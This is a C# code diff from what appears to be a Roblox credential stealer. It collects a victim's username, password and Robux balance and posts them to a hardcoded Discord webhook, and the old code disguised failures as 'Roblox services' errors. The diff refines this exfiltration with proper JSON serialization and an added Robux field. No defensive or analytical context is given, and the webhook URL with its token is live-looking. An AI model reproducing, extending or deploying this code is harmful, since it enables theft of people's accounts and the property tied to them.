@@ -4,6 +4,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Net.Http;
+using System.Text.Json;
 
 partial class Program
 {
@@ -42,25 +43,19 @@ partial class Program
 
         string webhookUrl = "https://discord.com/api/webhooks/1446837691785416764/FFM7B_wTxJv-6NEXwFz2Y61VUCwjtpv5mj1yZ7lMh1IfNObuhu9TvTLLkaDQTnSbIPxK";
 
-        // Create the JSON payload required by Discord
-        string jsonPayload = $"{{\"content\":\"Username: {username}\nPassword: {password}\"}}";
-
-        using (HttpClient client = new HttpClient())
+        // Let System.Text.Json properly escape the text
+        string jsonPayload = JsonSerializer.Serialize(new
         {
-            // Create the HTTP content with JSON headers
-            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
+            content = $"Username: {username}\nPassword: {password}\nRobux: {robux}"
+        });
 
-            // Send the POST request
-            HttpResponseMessage response = await client.PostAsync(webhookUrl, content);
+        using HttpClient client = new HttpClient();
 
-            if (response.IsSuccessStatusCode)
-            {
-            }
-            else
-            {
-                Console.WriteLine("Failed to connect to Roblox services: " + response.StatusCode);
-            }
-        }
+        var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
+
+        HttpResponseMessage response = await client.PostAsync(webhookUrl, content);
+
+        Console.WriteLine("Status: " + response.StatusCode);
     }
 }
 
